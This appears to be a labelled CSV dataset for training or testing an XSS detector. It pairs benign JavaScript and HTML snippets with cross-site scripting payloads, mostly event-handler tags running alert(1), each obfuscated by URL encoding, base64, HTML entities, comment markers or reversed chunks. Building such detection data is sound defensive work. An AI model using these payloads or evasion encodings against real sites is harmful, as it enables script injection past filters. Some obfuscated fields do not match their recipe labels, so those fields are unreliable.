sample_id,label,payload_original,payload_obfuscated,generator,recipe
2288,1,<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>,%3Cdl%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C%2Fdl%3E%3Cinput%20id%3Dy%20autofocus%3E,llm_style_t1.0,urlencode
2289,0,this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,llm_style_t1.0,none
2290,1,<b onpointerleave=alert(1)>xss</b>,%253Cb%2520onpointerleave%253Dalert%25281%2529%253Exss%253C%252Fb%253E,llm_style_t1.0,double_urlencode
2291,1,"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",%26amp%3Blt%3Bplaintext%20draggable%3D%26amp%3Bquot%3Btrue%26amp%3Bquot%3B%20ondragstart%3D%26amp%3Bquot%3Balert%281%29%26amp%3Bquot%3B%26amp%3Bgt%3Btest%26amp%3Blt%3B%2Fplaintext%26amp%3Bgt%3B,llm_style_t1.0,html_entities+html_then_urlencode
2292,1,"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>","<ul dragg/*OBF*/able/*OBF*/=""true"" ondragenter=""alert(1)"">test</ul>",llm_style_t1.0,comment_marker
2293,0,} _isanimated() { return this._element.classlist.contains(class_name_slide);,} _isanimated() { return this._element.classlist.contains(class_name_slide);,llm_style_t1.0,none
2294,1,"<spacer onmouseleave=""alert(1)"">test</spacer>",%3Cspacer%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fspacer%3E,llm_style_t1.0,urlencode+whitespace_noise
2295,0,relativex = e.touches[0].pagex - pos.left,relativex = e.touches[0].pagex - pos.left,llm_style_t1.0,none
2296,0,var $collapsiblelis = this.$el.children('li'),var $collapsiblelis = this.$el.children('li'),llm_style_t1.0,none
2297,0,"prev(element, selector) { let previous = element.previouselementsibling; while (previous) {","prev(element, selector) { let previous = element.previouselementsibling; while (previous) {",llm_style_t1.0,none
2298,0,$closesttrigger[0].m_dropdown.isopen ) { leavetoactivedropdowntrigger = true;,$closesttrigger[0].m_dropdown.isopen ) { leavetoactivedropdowntrigger = true;,llm_style_t1.0,none
2299,0,"const link = document.queryselector(`.bd-aside a[href=""${hash}""]`) if (!link) { return","const link = document.queryselector(`.bd-aside a[href=""${hash}""]`) if (!link) { return",llm_style_t1.0,none
2300,0,this._slide(order_next); } nextwhenvisible() {,this._slide(order_next); } nextwhenvisible() {,llm_style_t1.0,none
2301,0,} var clientrect = element.getboundingclientrect(); var scalex = 1;,} var clientrect = element.getboundingclientrect(); var scalex = 1;,llm_style_t1.0,none
2302,0,"group = unique(group.slice().sort(function(a, b){ return a - b","group = unique(group.slice().sort(function(a, b){ return a - b",llm_style_t1.0,none
2303,1,"<link draggable=""true"" ondragend=""alert(1)"">test</link>",%3Clink%20draggable%3D%22true%22%20ondragend%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,llm_style_t1.0,urlencode
2304,0,switch (type.tolowercase()) {,switch (type.tolowercase()) {,llm_style_t1.0,none
2305,1,"<dir onmouseout=""alert(1)"">test</dir>",&lt;dir onmouseout=&quot;alert(1)&quot;&gt;test&lt;/dir&gt;,llm_style_t1.0,html_entities
2306,0,"this.data(key, name[key]); } return this;","this.data(key, name[key]); } return this;",llm_style_t1.0,none
2307,1,"<title onmouseup=""alert(1)"">test</title>","tle></titest1)"">ert(=""alseupnmoule o<tit",llm_style_t1.0,reverse_chunks
2308,1,<data onpointerup=alert(1)>xss</data>,JTI2bHQlM0JkYXRhJTIwb25wb2ludGVydXAlM0RhbGVydCUyODElMjklMjZndCUzQnhzcyUyNmx0JTNCJTJGZGF0YSUyNmd0JTNC,llm_style_t1.0,html_then_urlencode+base64
2309,1,"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>",%26lt%3Bembed%20src%3D%26quot%3Bdata%3Aimage%2Fsvg%2Bxml%3Bbase64%2Cphn2zyb4bwxuczpzdmc9imh0dh%20a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv%20mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs%20aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw%20iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci%2Bywxlcnqoilh%20tuyipozwvc2nyaxb0pjwvc3znpg%3D%3D%26quot%3B%20type%3D%26quot%3Bimage%2Fsvg%2Bxml%26quot%3B%20allowscriptaccess%3D%26quot%3Balways%26quot%3B%26gt%3B%26lt%3B%2Fembed%26gt%3B,llm_style_t1.0,html_then_urlencode
2310,0,this.el.m_tooltip = this,this.el.m_tooltip = this,llm_style_t1.0,none
2311,1,"<form onformdata=""alert(1)""><button>click</button></form>",%3Cform%20onformdata%3D%22alert%281%29%22%3E%3Cbutton%3Eclick%3C%2Fbutton%3E%3C%2Fform%3E,llm_style_t1.0,urlencode
2312,0,"'notify:sass_compile' ]); grunt.registertask('server', ['browsersync', 'notify:server']);","'notify:sass_compile' ]); grunt.registertask('server', ['browsersync', 'notify:server']);",llm_style_t1.0,none
2313,0,"this._setattributeifnotexists(outerelem, 'role', 'presentation')","this._setattributeifnotexists(outerelem, 'role', 'presentation')",llm_style_t1.0,none
2314,1,"<strong onmouseup=""alert(1)"">test</strong>","<strong onmouseup= ""alert(1)"">test<  /  strong> ",llm_style_t1.0,whitespace_noise
2315,0,document.documentelement.nouilisteners.foreach(function( c ) {,document.documentelement.nouilisteners.foreach(function( c ) {,llm_style_t1.0,none
2316,0,const class_name_fade$1 = 'fade'; const class_name_show$1 = 'show'; const class_dropdown = 'dropdown';,const class_name_fade$1 = 'fade'; const class_name_show$1 = 'show'; const class_dropdown = 'dropdown';,llm_style_t1.0,none
2317,1,<form><button formaction=javascript:alert(1)>xss,%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aalert%281%29%3Exss,llm_style_t1.0,urlencode
2318,0,"}; var parallax = function (_component5) { _inherits(parallax, _component5);","}; var parallax = function (_component5) { _inherits(parallax, _component5);",llm_style_t1.0,none
2319,1,"<base onmousedown=""alert(1)"">test</base>",JTI1M0NiYXNlJTI1MjBvbm1vdXNlZG93biUyNTNEJTI1MjJhbGVydCUyNTI4MSUyNTI5JTI1MjIlMjUzRXRlc3QlMjUzQyUyNTJGYmFzZSUyNTNF,llm_style_t1.0,double_urlencode+base64
2320,0,const selector_nav_links = '.nav-link' const selector_nav_items = '.nav-item' const selector_list_items = '.list-group-item',const selector_nav_links = '.nav-link' const selector_nav_items = '.nav-item' const selector_list_items = '.list-group-item',llm_style_t1.0,none
2321,0,var dochandlekeyup = function (e) { m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) {,var dochandlekeyup = function (e) { m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) {,llm_style_t1.0,none
2322,1,<source onpointerup=alert(1)>xss</source>,PHNvdXJjZSBvbnBvaW50ZXJ1cD1hbGVydCgxKT54c3M8L3NvdXJjZT4=,llm_style_t1.0,base64
2323,0,} this._settabsandtabwidth(); this._animateindicator(previndex);,} this._settabsandtabwidth(); this._animateindicator(previndex);,llm_style_t1.0,none
2324,1,"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",%2526lt%253Bdiv%2520draggable%253D%2526quot%253Btrue%2526quot%253B%2520contenteditable%2526gt%253Bdrag%2520me%2526lt%253B%252Fdiv%2526gt%253B%2526lt%253Bu%2520ondrop%253Dalert%25281%2529%2520contenteditable%2526gt%253Bdrop%2520here%2526lt%253B%252Fu%2526gt%253B,llm_style_t1.0,html_entities+double_urlencode
2325,1,"<menu draggable=""true"" ondragleave=""alert(1)"">test</menu>","<menu dragg/*OBF* / able=""true"" ondragleave=""alert(1)"">test</menu>",llm_style_t1.0,comment_marker+whitespace_noise
2326,1,"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PGZvcm0gb25kcmFnb3Zlcj1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC9mb3JtPg==,llm_style_t1.0,base64
2327,0,var depmodifier = map.get(dep); if (depmodifier) { sort(depmodifier);,var depmodifier = map.get(dep); if (depmodifier) { sort(depmodifier);,llm_style_t1.0,none
2328,1,<img id=x tabindex=1 onfocus=alert(1)></img>,%25253Cimg%252520id%25253Dx%252520tabindex%25253D1%252520onfocus%25253Dalert%2525281%252529%25253E%252520%25253C%25252Fimg%25253E,llm_style_t1.0,whitespace_noise+urlencode+double_urlencode
2329,0,"removehandler(element, events, typeevent, callable, isdelegated ? handler : null); return; }","removehandler(element, events, typeevent, callable, isdelegated ? handler : null); return; }",llm_style_t1.0,none
2330,0,"<li><a href=""/wiki/otto_neurath"" title=""otto neurath"">otto neurath </a> </li>","<li><a href=""/wiki/otto_neurath"" title=""otto neurath"">otto neurath </a> </li>",llm_style_t1.0,none
2331,0,"<p><a href=""/wiki/knowledge_representation"" class=""mw-redirect"" title=""knowledge representation"">knowledge representation </a><sup id=""cite_ref-knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/knowledge_engineering"" title=""knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical ai research. some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. in addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-representing_time_94-0"" class=""reference""><a href=""#cite_note-representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-representing_causation_95-0"" class=""reference""><a href=""#cite_note-representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. a representation of ""what exists"" is an <a href=""/wiki/ontology_(computer_science)"" class=""mw-redirect"" title=""ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. the <a href=""/wiki/semantics"" title=""semantics"">semantics </a> of these are captured as <a href=""/wiki/description_logic"" title=""description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/web_ontology_language"" title=""web ontology language"">web ontology language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> the most general ontologies are called <a href=""/wiki/upper_ontology"" title=""upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-ontology_98-0"" class=""reference""><a href=""#cite_note-ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/domain_ontology"" class=""mw-redirect"" title=""domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>","<p><a href=""/wiki/knowledge_representation"" class=""mw-redirect"" title=""knowledge representation"">knowledge representation </a><sup id=""cite_ref-knowledge_representation_91-0"" class=""reference""><a href=""#cite_note-knowledge_representation-91"">&#91;88&#93; </a> </sup> and <a href=""/wiki/knowledge_engineering"" title=""knowledge engineering"">knowledge engineering </a><sup id=""cite_ref-knowledge_engineering_92-0"" class=""reference""><a href=""#cite_note-knowledge_engineering-92"">&#91;89&#93; </a> </sup> are central to classical ai research. some ""expert systems"" attempt to gather together explicit knowledge possessed by experts in some narrow domain. in addition, some projects attempt to gather the ""commonsense knowledge"" known to the average person into a database containing extensive knowledge about the world. among the things a comprehensive commonsense knowledge base would contain are: objects, properties, categories and relations between objects;<sup id=""cite_ref-representing_categories_and_relations_93-0"" class=""reference""><a href=""#cite_note-representing_categories_and_relations-93"">&#91;90&#93; </a> </sup> situations, events, states and time;<sup id=""cite_ref-representing_time_94-0"" class=""reference""><a href=""#cite_note-representing_time-94"">&#91;91&#93; </a> </sup> causes and effects;<sup id=""cite_ref-representing_causation_95-0"" class=""reference""><a href=""#cite_note-representing_causation-95"">&#91;92&#93; </a> </sup> knowledge about knowledge (what we know about what other people know);<sup id=""cite_ref-representing_knowledge_about_knowledge_96-0"" class=""reference""><a href=""#cite_note-representing_knowledge_about_knowledge-96"">&#91;93&#93; </a> </sup> and many other, less well researched domains. a representation of ""what exists"" is an <a href=""/wiki/ontology_(computer_science)"" class=""mw-redirect"" title=""ontology (computer science)"">ontology </a>: the set of objects, relations, concepts, and properties formally described so that software agents can interpret them. the <a href=""/wiki/semantics"" title=""semantics"">semantics </a> of these are captured as <a href=""/wiki/description_logic"" title=""description logic"">description logic </a> concepts, roles, and individuals, and typically implemented as classes, properties, and individuals in the <a href=""/wiki/web_ontology_language"" title=""web ontology language"">web ontology language </a>.<sup id=""cite_ref-97"" class=""reference""><a href=""#cite_note-97"">&#91;94&#93; </a> </sup> the most general ontologies are called <a href=""/wiki/upper_ontology"" title=""upper ontology"">upper ontologies </a>, which attempt to provide a foundation for all other knowledge<sup id=""cite_ref-ontology_98-0"" class=""reference""><a href=""#cite_note-ontology-98"">&#91;95&#93; </a> </sup> by acting as mediators between <a href=""/wiki/domain_ontology"" class=""mw-redirect"" title=""domain ontology"">domain ontologies </a> that cover specific knowledge about a particular knowledge domain (field of interest or area of concern). such formal knowledge representations can be used in content-based indexing and retrieval,<sup id=""cite_ref-99"" class=""reference""><a href=""#cite_note-99"">&#91;96&#93; </a> </sup> scene interpretation,<sup id=""cite_ref-100"" class=""reference""><a href=""#cite_note-100"">&#91;97&#93; </a> </sup> clinical decision support,<sup id=""cite_ref-101"" class=""reference""><a href=""#cite_note-101"">&#91;98&#93; </a> </sup> knowledge discovery (mining ""interesting"" and actionable inferences from large databases),<sup id=""cite_ref-102"" class=""reference""><a href=""#cite_note-102"">&#91;99&#93; </a> </sup> and other areas.<sup id=""cite_ref-103"" class=""reference""><a href=""#cite_note-103"">&#91;100&#93; </a> </sup>",llm_style_t1.0,none
2332,1,<datalist onpointerup=alert(1)>xss</datalist>,<datalist on/*OBF*/p/*OBF*/ointerup=alert(1)>xss</datalist>,llm_style_t1.0,comment_marker
2333,0,"newcoordinates = this._repositionwithinscreen( targetleft, targettop,","newcoordinates = this._repositionwithinscreen( targetleft, targettop,",llm_style_t1.0,none
2334,1,"<audio onmousemove=""alert(1)"">test</audio>",&lt;audio onmousemove=&quot;alert(1)&quot;&gt;test&lt;/audio&gt;,llm_style_t1.0,html_entities
2335,0,var baseplacement = placement ? getbaseplacement(placement) : null,var baseplacement = placement ? getbaseplacement(placement) : null,llm_style_t1.0,none
2336,0,"var b = a.length;2 !== b || h.obj(a[0]) ? h.fnc(c.duration) || (d.duration = c.duration / b) : a = { value: a }; }return m(a).map(function (a, b) { b = b ? 0 : c.delay;a = h.obj(a) && !h.pth(a) ? a : { value: a };h.und(a.delay) && (a.delay = b);return a;","var b = a.length;2 !== b || h.obj(a[0]) ? h.fnc(c.duration) || (d.duration = c.duration / b) : a = { value: a }; }return m(a).map(function (a, b) { b = b ? 0 : c.delay;a = h.obj(a) && !h.pth(a) ? a : { value: a };h.und(a.delay) && (a.delay = b);return a;",llm_style_t1.0,none
2337,0,"this._queuecallback(complete, element, element.classlist.contains(class_name_fade$1)); } _keydown(event) {","this._queuecallback(complete, element, element.classlist.contains(class_name_fade$1)); } _keydown(event) {",llm_style_t1.0,none
2338,0,</span></a></dt><dd>learn how to use python’s builtin logging on scrapy.</dd>,</span></a></dt><dd>learn how to use python’s builtin logging on scrapy.</dd>,llm_style_t1.0,none
2339,1,"<col onkeypress=""alert(1)"" contenteditable>test</col>",%26lt%3Bcol%20onkeypress%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fcol%26gt%3B,llm_style_t1.0,html_then_urlencode
2340,0,"<li><a href=""/wiki/domain-specific_language"" title=""domain-specific language"">domain-specific language </a> </li>","<li><a href=""/wiki/domain-specific_language"" title=""domain-specific language"">domain-specific language </a> </li>",llm_style_t1.0,none
2341,0,this._focustrap = this._initializefocustrap(); this._addeventlisteners(); },this._focustrap = this._initializefocustrap(); this._addeventlisteners(); },llm_style_t1.0,none
2342,1,"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",PG5leHRpZCBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ3N0YXJ0PSJhbGVydCgxKSI+dGVzdDwvbmV4dGlkPg==,llm_style_t1.0,base64+whitespace_noise
2343,1,<ol onpointerout=alert(1)>xss</ol>,JTI1M0NvbCUyNTIwb25wb2ludGVyb3V0JTI1M0RhbGVydCUyNTI4MSUyNTI5JTI1M0V4c3MlMjUzQyUyNTJGb2wlMjUzRQ==,llm_style_t1.0,double_urlencode+html_entities+base64
2344,1,"<style>@keyframes slidein {}</style><h1 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></h1>",%26amp%3Blt%3Bstyle%26amp%3Bgt%3B%40keyframes%20slidein%20%7B%7D%26amp%3Blt%3B%2Fstyle%26amp%3Bgt%3B%26amp%3Blt%3Bh1%20style%3D%26amp%3Bquot%3Banimation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%26amp%3Bquot%3B%20onanimationiteration%3D%26amp%3Bquot%3Balert%281%29%26amp%3Bquot%3B%26amp%3Bgt%3B%26amp%3Blt%3B%2Fh1%26amp%3Bgt%3B,llm_style_t1.0,html_entities+html_then_urlencode
2345,1,"<noembed onmouseup=""alert(1)"">test</noembed>",JlZD4=bm9lbWVzdDwvKSI+dGVydCgxPSJhbGVzZXVwb25tb31iZWQgPG5vZW,llm_style_t1.0,base64+reverse_chunks
2346,1,"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></link>",%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Clink%20id%3Dx%20style%3D%22transition%3Atransform%202s%22%20ontransitionrun%3Dalert%281%29%3E%3C%2Flink%3E,llm_style_t1.0,urlencode
2347,0,"if (prevselected !== selected) { $(this._valuedict[key].el).prop('selected', selected); this.$el.trigger('change');","if (prevselected !== selected) { $(this._valuedict[key].el).prop('selected', selected); this.$el.trigger('change');",llm_style_t1.0,none
2348,0,attributeoptions.html = tooltiptextoption,attributeoptions.html = tooltiptextoption,llm_style_t1.0,none
2349,0,"}) eventhandler.on(window, event_load_data_api, () => { for (const selector of selectorengine.find(open_selector)) {","}) eventhandler.on(window, event_load_data_api, () => { for (const selector of selectorengine.find(open_selector)) {",llm_style_t1.0,none
2350,1,<image onpointerleave=alert(1)>xss</image>,%253Cimage%2520onpointerleave%253Dalert%25281%2529%253Exss%253C%252Fimage%253E%2520,llm_style_t1.0,whitespace_noise+double_urlencode
2351,1,<aside onpointerover=alert(1)>xss</aside>,%253Caside%2520onpointerover%253Dalert%25281%2529%253Exss%253C%252Faside%253E,llm_style_t1.0,comment_marker+double_urlencode
2352,0,const data_api_key$1 = '.data-api',const data_api_key$1 = '.data-api',llm_style_t1.0,none
2353,1,<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>,JTNDbmV4dGlkJTIwaWQlM0R4JTIwdGFiaW5kZXglM0QxJTIwb25iZWZvcmVhY3RpdmF0ZSUzRGFsZXJ0JTI4MSUyOSUzRSUzQyUyRm5leHRpZCUzRQ==,llm_style_t1.0,urlencode+base64+html_entities
2354,0,b;for (b in a) { d[b] = c.hasownproperty(b) ? c[b] : a[b]; }return d;,b;for (b in a) { d[b] = c.hasownproperty(b) ? c[b] : a[b]; }return d;,llm_style_t1.0,none
2355,0,"arr = void 0, opts = this.options, isminyear = year === opts.minyear,","arr = void 0, opts = this.options, isminyear = year === opts.minyear,",llm_style_t1.0,none
2356,0,"acc[placement] = detectoverflow(state, {","acc[placement] = detectoverflow(state, {",llm_style_t1.0,none
2357,0,"}; function each(collection, callback) { var l = collection.length,","}; function each(collection, callback) { var l = collection.length,",llm_style_t1.0,none
2358,0,"}; class scrollspy extends component { constructor(el, options) {","}; class scrollspy extends component { constructor(el, options) {",llm_style_t1.0,none
2359,1,<embed onpointerout=alert(1)>xss</embed>,%2526lt%253Bembed%2520onpointerout%253Dalert%25281%2529%2526gt%253Bxss%2526lt%253B%252Fembed%2526gt%253B,llm_style_t1.0,html_then_urlencode+urlencode
2360,0,"this.modal.open(); } }, {","this.modal.open(); } }, {",llm_style_t1.0,none
2361,0,return gethtmlelementscroll(node),return gethtmlelementscroll(node),llm_style_t1.0,none
2362,0,const completecallback = () => { if (!this._config.scroll || this._config.backdrop) { this._focustrap.activate(),const completecallback = () => { if (!this._config.scroll || this._config.backdrop) { this._focustrap.activate(),llm_style_t1.0,none
2363,0,"var e = d[b], k = e.animatable, h = e.tweens,","var e = d[b], k = e.animatable, h = e.tweens,",llm_style_t1.0,none
2364,0,this._renderdatedisplay(); datepicker._settostartofday(this.date); this.gotodate(this.date);,this._renderdatedisplay(); datepicker._settostartofday(this.date); this.gotodate(this.date);,llm_style_t1.0,none
2365,0,"const event_keydown_dismiss = `keydown.dismiss${event_key}` const selector_data_toggle = '[data-bs-toggle=""offcanvas""]' const default = {","const event_keydown_dismiss = `keydown.dismiss${event_key}` const selector_data_toggle = '[data-bs-toggle=""offcanvas""]' const default = {",llm_style_t1.0,none
2366,0,"<li><a href=""#citerefmoravec1988"">moravec 1988 </a>, p.&#160;13, </li>","<li><a href=""#citerefmoravec1988"">moravec 1988 </a>, p.&#160;13, </li>",llm_style_t1.0,none
2367,0,"f.push(b[1]), n.push(b[2]); }a = r(n, function (a, b) { return f[b] === c;","f.push(b[1]), n.push(b[2]); }a = r(n, function (a, b) { return f[b] === c;",llm_style_t1.0,none
2368,0,"function component(classdef, el, options) {","function component(classdef, el, options) {",llm_style_t1.0,none
2369,0,} return abbr ? opts.i18n.weekdaysabbrev[day] : opts.i18n.weekdays[day]; },} return abbr ? opts.i18n.weekdaysabbrev[day] : opts.i18n.weekdays[day]; },llm_style_t1.0,none
2370,0,return } if (this._isshown()) {,return } if (this._isshown()) {,llm_style_t1.0,none
2371,1,"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",%26lt%3Bdfn%20draggable%3D%26quot%3Btrue%26quot%3B%20ondragenter%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fdfn%26gt%3B,llm_style_t1.0,html_then_urlencode
2372,0,} _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {,} _handlefocus(e) { if (!this.el.contains(e.target) && this._nthmodalopened === modal._modalsopen) {,llm_style_t1.0,none
2373,1,"<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>","<dfn draggable=""true"" ondragstart=""alert(1)"">test</dfn>",llm_style_t1.0,comment_marker
2374,1,"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",n&gt;;/sectio;test&lttable&gtntentediquot; colert(1)&=&quot;aforecopyion onbe&lt;sect,llm_style_t1.0,html_entities+reverse_chunks
2375,1,"<i draggable=""true"" ondragend=""alert(1)"">test</i>",">t</i>tes(1)""lertd=""aagenondrue"" =""trableragg<i d",llm_style_t1.0,reverse_chunks
2376,0,"} if ( entry.min === entry.max ) { throw new error(""nouislider: 'range' 'min' and 'max' cannot be equal."");","} if ( entry.min === entry.max ) { throw new error(""nouislider: 'range' 'min' and 'max' cannot be equal."");",llm_style_t1.0,none
2377,0,"'<div class=""datepicker-calendar""></div>',","'<div class=""datepicker-calendar""></div>',",llm_style_t1.0,none
2378,1,"<ol onpaste=""alert(1)"" contenteditable>test</ol>",%2526lt%253Bol%2520onpaste%253D%2526quot%253Balert%25281%2529%2526quot%253B%2520contenteditable%2526gt%253Btest%2526lt%253B%252Fol%2526gt%253B,llm_style_t1.0,html_then_urlencode+urlencode
2379,0,"document.addeventlistener('keydown', dochandlekeydown, true); document.addeventlistener('keyup', dochandlekeyup, true); document.addeventlistener('focus', dochandlefocus, true);","document.addeventlistener('keydown', dochandlekeydown, true); document.addeventlistener('keyup', dochandlekeyup, true); document.addeventlistener('focus', dochandlefocus, true);",llm_style_t1.0,none
2380,0,const event_key$a = `.${data_key$9}`,const event_key$a = `.${data_key$9}`,llm_style_t1.0,none
2381,0,execute(direction > 0 ? this._config.rightcallback : this._config.leftcallback); } _initevents() {,execute(direction > 0 ? this._config.rightcallback : this._config.leftcallback); } _initevents() {,llm_style_t1.0,none
2382,1,"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",PG9sIG9ua2V5dXA9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU%2BdGVzdDwvb2w%2B,llm_style_t1.0,base64+urlencode
2383,0,"let purekey = key.replace(/^bs/, '')","let purekey = key.replace(/^bs/, '')",llm_style_t1.0,none
2384,0,"this._backdrop.hide(); const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding);","this._backdrop.hide(); const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding);",llm_style_t1.0,none
2385,1,"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;picture style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/picture&gt;,llm_style_t1.0,html_entities
2386,0,"} else { firstimage.one('load', function (el, i) { _this65.$el.css('height', el.offsetheight + 'px');","} else { firstimage.one('load', function (el, i) { _this65.$el.css('height', el.offsetheight + 'px');",llm_style_t1.0,none
2387,0,if (element.getattribute('role') !== 'tab') { element.classlist.add(class_name_show) return,if (element.getattribute('role') !== 'tab') { element.classlist.add(class_name_show) return,llm_style_t1.0,none
